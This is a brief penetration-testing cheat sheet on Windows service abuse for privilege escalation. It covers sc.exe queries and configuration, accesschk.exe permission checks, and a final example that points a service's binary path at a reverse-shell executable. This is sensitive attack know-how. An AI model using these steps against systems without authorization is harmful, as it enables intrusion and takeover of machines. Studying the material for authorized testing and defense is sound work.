---
description: >-
  Basic commands when abusing services to elevate privileges after being
  identified with a tool such as WinPEAS.
---

# Service Exploitation

### Basic Commands

#### Query the Configuration of a Service

\`sc.exe qc \[SERVICE\_NAME]

#### Query the Current Status of a Service

`sc.exe query [SERVICE_NAME]`

#### Modify an option of a service:&#x20;

`sc.exe config [SERVICE_NAME] [OPTION]= [VALUE]`

#### Start and Stop a Service

`net start/stop [SERVICE_NAME]`

### Accesschk.exe

#### Use [Accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to validate service permissions:

`.\accesschk.exe /accepteula -uwcqv user [SERVICE_NAME]`

* What we are looking for in the output is the `SERVICE_START` and `SERVICE_STOP` permissions.
* We also want to confirm that it is running under a user with higher privileges (e.g., `LocalSystem`)

### Notes

* Validate if you can start/stop the service or the machine. If you cannot then you may not be able to use it to escalate your privileges.&#x20;
* An easy way to escalate privileges utilizing a service is to modify the binaries path. The following demonstrates an example of this:
  * `sc config [SERVICE_NAME] binpath= "\"C:\Windows\Tasks\reverse.exe\""`

